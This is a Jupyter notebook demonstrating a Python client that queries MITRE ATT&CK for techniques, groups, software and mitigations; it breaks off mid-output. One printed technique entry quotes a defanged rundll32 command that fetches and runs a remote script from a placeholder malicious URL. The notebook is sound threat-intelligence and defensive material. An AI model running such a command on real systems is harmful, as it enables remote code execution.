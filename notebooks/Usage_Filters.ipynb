{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# **MITRE ATT&CK API FILTERS**: Python Client\n",
    "------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Import ATTACK API Client"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from attackcti import attack_client"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Import Extra Libraries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pprint\n",
    "from pandas import *\n",
    "from pandas.io.json import json_normalize"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Initialize ATT&CK Client Variable"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "lift = attack_client()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Technique by Name (TAXII)\n",
    "You can use a custom method in the attack_client class to get a technique across all the matrices by its name. It is case sensitive."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "technique_name = lift.get_technique_by_name('Rundll32')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'contributors': ['Ricardo Dias', 'Casey Smith'],\n",
      " 'data sources': ['File monitoring',\n",
      "                  'Binary file metadata',\n",
      "                  'Process command-line parameters',\n",
      "                  'Process monitoring'],\n",
      " 'defense bypassed': ['Anti-virus', 'Application whitelisting'],\n",
      " 'detectable': None,\n",
      " 'detectable description': None,\n",
      " 'difficulty': None,\n",
      " 'difficulty description': None,\n",
      " 'effective permissions': None,\n",
      " 'matrix': 'mitre-attack',\n",
      " 'network requirements': None,\n",
      " 'object created': '2017-05-31T21:31:06.045Z',\n",
      " 'object created by ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5',\n",
      " 'object id': 'attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5',\n",
      " 'object marking refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],\n",
      " 'object modified': '2018-04-18T17:59:24.739Z',\n",
      " 'object type': 'attack-pattern',\n",
      " 'permission required': ['User'],\n",
      " 'platforms': ['Windows'],\n",
      " 'remote support': False,\n",
      " 'system requirements': None,\n",
      " 'tactic': ['defense-evasion', 'execution'],\n",
      " 'tactic type': None,\n",
      " 'technique': 'Rundll32',\n",
      " 'technique description': 'The rundll32.exe program can be called to execute '\n",
      "                          'an arbitrary binary. Adversaries may take advantage '\n",
      "                          'of this functionality to proxy execution of code to '\n",
      "                          'avoid triggering security tools that may not '\n",
      "                          'monitor execution of the rundll32.exe process '\n",
      "                          'because of whitelists or false positives from '\n",
      "                          'Windows using rundll32.exe for normal operations.\\n'\n",
      "                          '\\n'\n",
      "                          'Rundll32.exe can be used to execute Control Panel '\n",
      "                          'Item files (.cpl) through the undocumented '\n",
      "                          'shell32.dll functions <code>Control_RunDLL</code> '\n",
      "                          'and <code>Control_RunDLLAsUser</code>. '\n",
      "                          'Double-clicking a .cpl file also causes '\n",
      "                          'rundll32.exe to execute. (Citation: Trend Micro '\n",
      "                          'CPL)\\n'\n",
      "                          '\\n'\n",
      "                          'Rundll32 can also been used to execute scripts such '\n",
      "                          'as JavaScript. This can be done using a syntax '\n",
      "                          'similar to this: <code>rundll32.exe '\n",
      "                          'javascript:\"\\\\..\\\\mshtml,RunHTMLApplication '\n",
      "                          '\";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  '\n",
      "                          'This behavior has been seen used by malware such as '\n",
      "                          'Poweliks. (Citation: This is Security Command Line '\n",
      "                          'Confusion)\\n'\n",
      "                          '\\n'\n",
      "                          'Detection: Use process monitoring to monitor the '\n",
      "                          'execution and arguments of rundll32.exe. Compare '\n",
      "                          'recent invocations of rundll32.exe with prior '\n",
      "                          'history of known good arguments and loaded DLLs to '\n",
      "                          'determine anomalous and potentially adversarial '\n",
      "                          'activity. Command arguments used with the '\n",
      "                          'rundll32.exe invocation may also be useful in '\n",
      "                          'determining the origin and purpose of the DLL being '\n",
      "                          'loaded.\\n'\n",
      "                          '\\n'\n",
      "                          'Platforms: Windows\\n'\n",
      "                          '\\n'\n",
      "                          'Data Sources: File monitoring, Binary file '\n",
      "                          'metadata, Process command-line parameters, Process '\n",
      "                          'monitoring\\n'\n",
      "                          '\\n'\n",
      "                          'Defense Bypassed: Anti-virus, Application '\n",
      "                          'whitelisting\\n'\n",
      "                          '\\n'\n",
      "                          'Permissions Required: User\\n'\n",
      "                          '\\n'\n",
      "                          'Remote Support: No\\n'\n",
      "                          '\\n'\n",
      "                          'Contributors: Ricardo Dias, Casey Smith',\n",
      " 'technique id': 'T1085',\n",
      " 'technique references': None,\n",
      " 'url': 'https://attack.mitre.org/wiki/Technique/T1085'}\n"
     ]
    }
   ],
   "source": [
    "pprint.pprint(technique_name)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Data Sources from All Techniques (TAXII)\n",
    "* You can also get all the data sources available in ATT&CK\n",
    "* Currently the only techniques with data sources are the ones in Enterprise ATT&CK."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "data_sources = lift.get_all_data_sources()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "48"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(data_sources)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['malware reverse engineering',\n",
       " 'ssl/tls inspection',\n",
       " 'digital certificate logs',\n",
       " 'network protocol analysis',\n",
       " 'network device logs',\n",
       " 'network intrusion detection system',\n",
       " 'email gateway',\n",
       " 'dll monitoring',\n",
       " 'named pipes',\n",
       " 'environment variable',\n",
       " 'process use of network',\n",
       " 'file monitoring',\n",
       " 'packet capture',\n",
       " 'efi',\n",
       " 'third-party application logs',\n",
       " 'process command-line parameters',\n",
       " 'web proxy',\n",
       " 'bios',\n",
       " 'netflow/enclave netflow',\n",
       " 'host network interface',\n",
       " 'access tokens',\n",
       " 'user interface',\n",
       " 'system calls',\n",
       " 'dns records',\n",
       " 'mail server',\n",
       " 'vbr',\n",
       " 'sensor health and status',\n",
       " 'web logs',\n",
       " 'application logs',\n",
       " 'binary file metadata',\n",
       " 'web application firewall logs',\n",
       " 'mbr',\n",
       " 'anti-virus',\n",
       " 'loaded dlls',\n",
       " 'asset management',\n",
       " 'windows registry',\n",
       " 'windows error reporting',\n",
       " 'windows event logs',\n",
       " 'detonation chamber',\n",
       " 'browser extensions',\n",
       " 'data loss prevention',\n",
       " 'wmi objects',\n",
       " 'api monitoring',\n",
       " 'kernel drivers',\n",
       " 'powershell logs',\n",
       " 'process monitoring',\n",
       " 'services',\n",
       " 'authentication logs']"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data_sources"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Any STIX Object by ID (TAXII)\n",
    "* You can get any STIX object by its id across all the matrices. It is case sensitive.\n",
    "* You can use the following STIX Object Types:\n",
    "  * attack-pattern >  techniques\n",
    "  * course-of-action > mitigations\n",
    "  * intrusion-set > groups\n",
    "  * malware\n",
    "  * tool"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "object_by_id = lift.get_object_by_attack_id('attack-pattern', 'PRE-T1054')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'contributors': None,\n",
      " 'data sources': None,\n",
      " 'defense bypassed': None,\n",
      " 'detectable': 'No',\n",
      " 'detectable description': 'This activity is indistinguishable from legitimate '\n",
      "                           'business uses and easy to obtain.',\n",
      " 'difficulty': 'Yes',\n",
      " 'difficulty description': 'Large quantities of data exists on people, '\n",
      "                           'organizations and technologies whether divulged '\n",
      "                           'wittingly or collected as part of doing business '\n",
      "                           'on the Internet (unbeknownst to the '\n",
      "                           'user/company).  Search engine and database '\n",
      "                           'indexing companies continuously mine this '\n",
      "                           'information and make it available to anyone who '\n",
      "                           'queries for it.',\n",
      " 'effective permissions': None,\n",
      " 'matrix': 'mitre-pre-attack',\n",
      " 'network requirements': None,\n",
      " 'object created': '2017-12-14T16:46:06.044Z',\n",
      " 'object created by ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5',\n",
      " 'object id': 'attack-pattern--028ad431-84c5-4eb7-a364-2b797c234f88',\n",
      " 'object marking refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],\n",
      " 'object modified': '2018-04-18T17:59:24.739Z',\n",
      " 'object type': 'attack-pattern',\n",
      " 'permission required': None,\n",
      " 'platforms': None,\n",
      " 'remote support': None,\n",
      " 'system requirements': None,\n",
      " 'tactic': ['organizational-information-gathering'],\n",
      " 'tactic type': None,\n",
      " 'technique': 'Acquire OSINT data sets and information',\n",
      " 'technique description': 'Data sets can be anything from Security Exchange '\n",
      "                          'Commission (SEC) filings to public phone numbers. '\n",
      "                          'Many datasets are now either publicly available for '\n",
      "                          'free or can be purchased from a variety of data '\n",
      "                          'vendors.  Open source intelligence (OSINT) is '\n",
      "                          'intelligence gathered from publicly available '\n",
      "                          'sources. This can include both information gathered '\n",
      "                          'on-line as well as in the physical world. '\n",
      "                          '(Citation: SANSThreatProfile) (Citation: '\n",
      "                          'Infosec-osint) (Citation: isight-osint)\\n'\n",
      "                          '\\n'\n",
      "                          'Detectable by Common Defenses: No\\n'\n",
      "                          '\\n'\n",
      "                          'Detectable by Common Defenses explanation: This '\n",
      "                          'activity is indistinguishable from legitimate '\n",
      "                          'business uses and easy to obtain.\\n'\n",
      "                          '\\n'\n",
      "                          'Difficulty for the Adversary: Yes\\n'\n",
      "                          '\\n'\n",
      "                          'Difficulty for the Adversary explanation: Large '\n",
      "                          'quantities of data exists on people, organizations '\n",
      "                          'and technologies whether divulged wittingly or '\n",
      "                          'collected as part of doing business on the Internet '\n",
      "                          '(unbeknownst to the user/company).  Search engine '\n",
      "                          'and database indexing companies continuously mine '\n",
      "                          'this information and make it available to anyone '\n",
      "                          'who queries for it.',\n",
      " 'technique id': 'PRE-T1054',\n",
      " 'technique references': None,\n",
      " 'url': 'https://attack.mitre.org/pre-attack/index.php/Technique/PRE-T1054'}\n"
     ]
    }
   ],
   "source": [
    "pprint.pprint(object_by_id)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Any Group by Alias (TAXII)\n",
    "You can get any Group by its Alias property across all the matrices. It is case sensitive."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "group_name = lift.get_group_by_alias('Cozy Bear')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'group': 'APT29',\n",
      " 'group aliases': ['APT29', 'The Dukes', 'Cozy Bear', 'CozyDuke'],\n",
      " 'group description': 'APT29 is threat group that has been attributed to the '\n",
      "                      'Russian government and has operated since at least '\n",
      "                      '2008. (Citation: F-Secure The Dukes) (Citation: GRIZZLY '\n",
      "                      'STEPPE JAR) This group reportedly compromised the '\n",
      "                      'Democratic National Committee starting in the summer of '\n",
      "                      '2015. (Citation: Crowdstrike DNC June 2016)',\n",
      " 'group id': 'G0016',\n",
      " 'group references': None,\n",
      " 'matrix': 'mitre-attack',\n",
      " 'object created': '2017-05-31T21:31:52.748Z',\n",
      " 'object created by ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5',\n",
      " 'object id': 'intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542',\n",
      " 'object modified': '2018-04-18T17:59:24.739Z',\n",
      " 'object type': 'intrusion-set',\n",
      " 'url': 'https://attack.mitre.org/wiki/Group/G0016'}\n"
     ]
    }
   ],
   "source": [
    "pprint.pprint(group_name)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Relationships by Any Object (TAXII)\n",
    "* You can get specific relationships defined in ATT&CK for specific ogjects across all the matrices.\n",
    "* The valid options are: **groups**, **software** and **mitigations**\n",
    "* This function collects all the relationships available in ATT&CK via the **get_all_relationships()** function. Then, depending on the specific stix object requested, the information is filtered.\n",
    "* The function enriches the ouput of the **get_all_relationships()** one by adding more context to the **source object** defined in the **Relationships stix object**.\n",
    "* You get more information about the source and also keep the **target source** object id to then map the results to the target stix object."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'matrix': 'mitre-attack',\n",
      " 'relationship description': 'can be used to create BITS Jobs to upload files '\n",
      "                             'from a compromised host.',\n",
      " 'software': 'BITSAdmin',\n",
      " 'software aliases': ['BITSAdmin'],\n",
      " 'software description': 'is a command line tool used to create and manage '\n",
      "                         'BITS Jobs. (Citation: Microsoft BITSAdmin)\\n'\n",
      "                         '\\n'\n",
      "                         'Aliases: BITSAdmin',\n",
      " 'software id': 'S0190',\n",
      " 'software labels': ['tool'],\n",
      " 'software references': None,\n",
      " 'software type': 'tool',\n",
      " 'target object': 'attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776',\n",
      " 'url': 'https://attack.mitre.org/wiki/Software/S0190'}\n"
     ]
    }
   ],
   "source": [
    "relationships = lift.get_relationships_by_object('software')\n",
    "pprint.pprint(relationships[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get All Techniques with Mitigations (TAXII)\n",
    "The difference with this function and **get_all_techniques()** is that **get_all_techniques_with_mitigations** returns (of course haha) mitigations mapped to their respective techniques. This is useful for when you want to gather mitigations and techniques all at once."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "complete_techniques = lift.get_all_techniques_with_mitigations()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'contributors': None,\n",
      " 'data sources': ['File monitoring',\n",
      "                  'Process Monitoring',\n",
      "                  'Process command-line parameters',\n",
      "                  'Process use of network'],\n",
      " 'defense bypassed': None,\n",
      " 'detectable': None,\n",
      " 'detectable description': None,\n",
      " 'difficulty': None,\n",
      " 'difficulty description': None,\n",
      " 'effective permissions': None,\n",
      " 'matrix': 'mitre-attack',\n",
      " 'mitigation': '.bash_profile and .bashrc Mitigation',\n",
      " 'mitigation description': 'Making these files immutable and only changeable '\n",
      "                           'by certain administrators will limit the ability '\n",
      "                           'for adversaries to easily create user level '\n",
      "                           'persistence.',\n",
      " 'mitigation id': 'T1156',\n",
      " 'mitigation references': None,\n",
      " 'network requirements': None,\n",
      " 'permission required': ['User', 'Administrator'],\n",
      " 'platforms': ['Linux', 'macOS'],\n",
      " 'remote support': None,\n",
      " 'system requirements': None,\n",
      " 'tactic': ['persistence'],\n",
      " 'tactic type': None,\n",
      " 'technique': '.bash_profile and .bashrc',\n",
      " 'technique description': '<code>~/.bash_profile</code> and '\n",
      "                          \"<code>~/.bashrc</code> are executed in a user's \"\n",
      "                          'context when a new shell opens or when a user logs '\n",
      "                          'in so that their environment is set correctly. '\n",
      "                          '<code>~/.bash_profile</code> is executed for login '\n",
      "                          'shells and <code>~/.bashrc</code> is executed for '\n",
      "                          'interactive non-login shells. This means that when '\n",
      "                          'a user logs in (via username and password) to the '\n",
      "                          'console (either locally or remotely via something '\n",
      "                          'like SSH), <code>~/.bash_profile</code> is executed '\n",
      "                          'before the initial command prompt is returned to '\n",
      "                          'the user. After that, every time a new shell is '\n",
      "                          'opened, <code>~/.bashrc</code> is executed. This '\n",
      "                          'allows users more fine grained control over when '\n",
      "                          'they want certain commands executed.\\n'\n",
      "                          '\\n'\n",
      "                          \"Mac's Terminal.app is a little different in that it \"\n",
      "                          'runs a login shell by default each time a new '\n",
      "                          'terminal window is opened, thus calling '\n",
      "                          '<code>~/.bash_profile</code> each time instead of '\n",
      "                          '<code>~/.bashrc</code>.\\n'\n",
      "                          '\\n'\n",
      "                          'These files are meant to be written to by the local '\n",
      "                          'user to configure their own environment; however, '\n",
      "                          'adversaries can also insert code into these files '\n",
      "                          'to gain persistence each time a user logs in or '\n",
      "                          'opens a new shell  (Citation: amnesia malware).\\n'\n",
      "                          '\\n'\n",
      "                          'Detection: While users may customize their '\n",
      "                          '<code>~/.bashrc</code> and '\n",
      "                          '<code>~/.bash_profile</code> files , there are only '\n",
      "                          'certain types of commands that typically appear in '\n",
      "                          'these files. Monitor for abnormal commands such as '\n",
      "                          'execution of unknown programs, opening network '\n",
      "                          'sockets, or reaching out across the network when '\n",
      "                          'user profiles are loaded during the login process.\\n'\n",
      "                          '\\n'\n",
      "                          'Platforms: Linux, macOS\\n'\n",
      "                          '\\n'\n",
      "                          'Data Sources: File monitoring, Process Monitoring, '\n",
      "                          'Process command-line parameters, Process use of '\n",
      "                          'network\\n'\n",
      "                          '\\n'\n",
      "                          'Permissions Required: User, Administrator',\n",
      " 'technique id': 'T1156',\n",
      " 'technique references': None,\n",
      " 'url': 'https://attack.mitre.org/wiki/Technique/T1156'}\n"
     ]
    }
   ],
   "source": [
    "pprint.pprint(complete_techniques[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Techniques Used by Software (TAXII)\n",
    "If you do not provide the name of a specific **Software** (Case Sensitive), the function returns information about every piece of software across all the matrices."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "software_techniques = lift.get_techniques_used_by_software('BITSAdmin')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'contributors': None,\n",
      " 'data sources': ['User interface',\n",
      "                  'Process monitoring',\n",
      "                  'Process use of network',\n",
      "                  'Packet capture',\n",
      "                  'Netflow/Enclave netflow',\n",
      "                  'Network protocol analysis'],\n",
      " 'defense bypassed': None,\n",
      " 'detectable': None,\n",
      " 'detectable description': None,\n",
      " 'difficulty': None,\n",
      " 'difficulty description': None,\n",
      " 'effective permissions': None,\n",
      " 'matrix': 'mitre-attack',\n",
      " 'network requirements': True,\n",
      " 'permission required': None,\n",
      " 'platforms': ['Linux', 'macOS', 'Windows'],\n",
      " 'relationship description': 'can be used to create BITS Jobs to upload files '\n",
      "                             'from a compromised host.',\n",
      " 'remote support': None,\n",
      " 'software': 'BITSAdmin',\n",
      " 'software aliases': ['BITSAdmin'],\n",
      " 'software description': 'is a command line tool used to create and manage '\n",
      "                         'BITS Jobs. (Citation: Microsoft BITSAdmin)\\n'\n",
      "                         '\\n'\n",
      "                         'Aliases: BITSAdmin',\n",
      " 'software id': 'S0190',\n",
      " 'software labels': ['tool'],\n",
      " 'software references': None,\n",
      " 'system requirements': None,\n",
      " 'tactic': ['exfiltration'],\n",
      " 'tactic type': None,\n",
      " 'technique': 'Exfiltration Over Alternative Protocol',\n",
      " 'technique description': 'Data exfiltration is performed with a different '\n",
      "                          'protocol from the main command and control protocol '\n",
      "                          'or channel. The data is likely to be sent to an '\n",
      "                          'alternate network location from the main command '\n",
      "                          'and control server. Alternate protocols include '\n",
      "                          'FTP, SMTP, HTTP/S, DNS, or some other network '\n",
      "                          'protocol. Different channels could include Internet '\n",
      "                          'Web services such as cloud storage.\\n'\n",
      "                          '\\n'\n",
      "                          'Detection: Analyze network data for uncommon data '\n",
      "                          'flows (e.g., a client sending significantly more '\n",
      "                          'data than it receives from a server). Processes '\n",
      "                          'utilizing the network that do not normally have '\n",
      "                          'network communication or have never been seen '\n",
      "                          'before are suspicious. Analyze packet contents to '\n",
      "                          'detect communications that do not follow the '\n",
      "                          'expected protocol behavior for the port that is '\n",
      "                          'being used. (Citation: University of Birmingham '\n",
      "                          'C2)\\n'\n",
      "                          '\\n'\n",
      "                          'Platforms: Linux, macOS, Windows\\n'\n",
      "                          '\\n'\n",
      "                          'Data Sources: User interface, Process monitoring, '\n",
      "                          'Process use of network, Packet capture, '\n",
      "                          'Netflow/Enclave netflow, Network protocol analysis\\n'\n",
      "                          '\\n'\n",
      "                          'Requires Network: Yes',\n",
      " 'technique id': 'T1048',\n",
      " 'technique references': None,\n",
      " 'url': 'https://attack.mitre.org/wiki/Technique/T1048'}\n"
     ]
    }
   ],
   "source": [
    "pprint.pprint(software_techniques[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Techniques Used by Group (TAXII)\n",
    "If you do not provide the name of a specific **Group** (Case Sensitive), the function returns information about all the groups available across all the matrices."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "group_techniques = lift.get_techniques_used_by_group('APT12')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'contributors': None,\n",
      " 'data sources': None,\n",
      " 'defense bypassed': None,\n",
      " 'detectable': 'No',\n",
      " 'detectable description': 'Normally, defender is unable to detect.  May '\n",
      "                           'change for special use cases or adversary and '\n",
      "                           'defender overlays.',\n",
      " 'difficulty': 'Yes',\n",
      " 'difficulty description': 'This is the normal adversary targeting cycle where '\n",
      "                           'they utilize our poor OPSEC practices to their '\n",
      "                           'advantage.',\n",
      " 'effective permissions': None,\n",
      " 'group': 'APT12',\n",
      " 'group aliases': ['APT12', 'IXESHE', 'DynCalc', 'Numbered Panda', 'DNSCALC'],\n",
      " 'group description': 'APT12 is a threat group that has been attributed to '\n",
      "                      'China. (Citation: Meyers Numbered Panda)',\n",
      " 'group id': 'G0005',\n",
      " 'group references': None,\n",
      " 'matrix': 'mitre-pre-attack',\n",
      " 'network requirements': None,\n",
      " 'permission required': None,\n",
      " 'platforms': None,\n",
      " 'relationship description': None,\n",
      " 'remote support': None,\n",
      " 'system requirements': None,\n",
      " 'tactic': ['target-selection'],\n",
      " 'tactic type': None,\n",
      " 'technique': 'Determine strategic target',\n",
      " 'technique description': 'An adversary undergoes an iterative target '\n",
      "                          'selection process that may begin either broadly and '\n",
      "                          'narrow down into specifics (strategic to tactical) '\n",
      "                          'or narrowly and expand outward (tactical to '\n",
      "                          'strategic).  As part of this process, an adversary '\n",
      "                          'may determine a high level target they wish to '\n",
      "                          'attack. One example of this may be a particular '\n",
      "                          'country, government, or commercial sector. '\n",
      "                          '(Citation: CyberAdversaryBehavior) (Citation: '\n",
      "                          'JP3-60) (Citation: JP3-12 (R)) (Citation: DoD Cyber '\n",
      "                          '2015)\\n'\n",
      "                          '\\n'\n",
      "                          'Detectable by Common Defenses: No\\n'\n",
      "                          '\\n'\n",
      "                          'Detectable by Common Defenses explanation: '\n",
      "                          'Normally, defender is unable to detect.  May change '\n",
      "                          'for special use cases or adversary and defender '\n",
      "                          'overlays.\\n'\n",
      "                          '\\n'\n",
      "                          'Difficulty for the Adversary: Yes\\n'\n",
      "                          '\\n'\n",
      "                          'Difficulty for the Adversary explanation: This is '\n",
      "                          'the normal adversary targeting cycle where they '\n",
      "                          'utilize our poor OPSEC practices to their '\n",
      "                          'advantage.',\n",
      " 'technique id': 'PRE-T1018',\n",
      " 'technique references': None,\n",
      " 'url': 'https://attack.mitre.org/pre-attack/index.php/Technique/PRE-T1018'}\n"
     ]
    }
   ],
   "source": [
    "pprint.pprint(group_techniques[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Software Used by Group (TAXII)\n",
    "If you do not provide the name of a specific Group, it returns information about all the groups available across all the matrices."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "group_software = lift.get_software_used_by_group('APT12')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'group': 'APT12',\n",
      " 'group aliases': ['APT12', 'IXESHE', 'DynCalc', 'Numbered Panda', 'DNSCALC'],\n",
      " 'group description': 'APT12 is a threat group that has been attributed to '\n",
      "                      'China. (Citation: Meyers Numbered Panda)',\n",
      " 'group id': 'G0005',\n",
      " 'group references': None,\n",
      " 'matrix': 'mitre-attack',\n",
      " 'relationship description': None,\n",
      " 'software': 'RIPTIDE',\n",
      " 'software aliases': ['RIPTIDE'],\n",
      " 'software description': 'RIPTIDE is a proxy-aware backdoor used by APT12. '\n",
      "                         '(Citation: Moran 2014)\\n'\n",
      "                         '\\n'\n",
      "                         'Aliases: RIPTIDE',\n",
      " 'software id': 'S0003',\n",
      " 'software labels': ['malware'],\n",
      " 'software references': None,\n",
      " 'software url': 'https://attack.mitre.org/wiki/Software/S0003'}\n"
     ]
    }
   ],
   "source": [
    "pprint.pprint(group_software[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Everything Used by Group (TAXII)\n",
    "* This function does not provide techniques defined for each Software that was used by group.\n",
    "* The information returned covers techniques that were used by a group and the name and description of software.\n",
    "* If you do not provide the name of a specific **Group**, it returns information about all the groups available across all the matrices."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_used_by_group = lift.get_all_used_by_group('APT12')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'group': 'APT12',\n",
      " 'group aliases': ['APT12', 'IXESHE', 'DynCalc', 'Numbered Panda', 'DNSCALC'],\n",
      " 'group description': 'APT12 is a threat group that has been attributed to '\n",
      "                      'China. (Citation: Meyers Numbered Panda)',\n",
      " 'group id': 'G0005',\n",
      " 'group references': None,\n",
      " 'matrix': 'mitre-attack',\n",
      " 'relationship description': None,\n",
      " 'software': 'RIPTIDE',\n",
      " 'software aliases': ['RIPTIDE'],\n",
      " 'software description': 'RIPTIDE is a proxy-aware backdoor used by APT12. '\n",
      "                         '(Citation: Moran 2014)\\n'\n",
      "                         '\\n'\n",
      "                         'Aliases: RIPTIDE',\n",
      " 'software id': 'S0003',\n",
      " 'software labels': ['malware'],\n",
      " 'software references': None,\n",
      " 'software url': 'https://attack.mitre.org/wiki/Software/S0003'}\n"
     ]
    }
   ],
   "source": [
    "pprint.pprint(all_used_by_group[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get All ATT&CK (TAXII)\n",
    "* This function collects everything from the ATT&CK framework and presents it as a long list of dictionaries making it easy to display the results as a table\n",
    "* It collects all the information from the following functions:\n",
    "  * **get_all_techniques_with_mitigations()**\n",
    "  * **get_all_software()**\n",
    "  * **get_techniques_used_by_software()**\n",
    "  * **get_all_groups()**\n",
    "  * **get_all_used_by_group()**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CPU times: user 9.58 s, sys: 204 ms, total: 9.79 s\n",
      "Wall time: 31.2 s\n"
     ]
    }
   ],
   "source": [
    "%time all_attack_framework = lift.get_all_attack()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "list"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "type(all_attack_framework)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'contributors': None,\n",
      " 'data sources': ['File monitoring',\n",
      "                  'Process Monitoring',\n",
      "                  'Process command-line parameters',\n",
      "                  'Process use of network'],\n",
      " 'defense bypassed': None,\n",
      " 'detectable': None,\n",
      " 'detectable description': None,\n",
      " 'difficulty': None,\n",
      " 'difficulty description': None,\n",
      " 'effective permissions': None,\n",
      " 'matrix': 'mitre-attack',\n",
      " 'mitigation': '.bash_profile and .bashrc Mitigation',\n",
      " 'mitigation description': 'Making these files immutable and only changeable '\n",
      "                           'by certain administrators will limit the ability '\n",
      "                           'for adversaries to easily create user level '\n",
      "                           'persistence.',\n",
      " 'mitigation id': 'T1156',\n",
      " 'mitigation references': None,\n",
      " 'network requirements': None,\n",
      " 'permission required': ['User', 'Administrator'],\n",
      " 'platforms': ['Linux', 'macOS'],\n",
      " 'remote support': None,\n",
      " 'system requirements': None,\n",
      " 'tactic': ['persistence'],\n",
      " 'tactic type': None,\n",
      " 'technique': '.bash_profile and .bashrc',\n",
      " 'technique description': '<code>~/.bash_profile</code> and '\n",
      "                          \"<code>~/.bashrc</code> are executed in a user's \"\n",
      "                          'context when a new shell opens or when a user logs '\n",
      "                          'in so that their environment is set correctly. '\n",
      "                          '<code>~/.bash_profile</code> is executed for login '\n",
      "                          'shells and <code>~/.bashrc</code> is executed for '\n",
      "                          'interactive non-login shells. This means that when '\n",
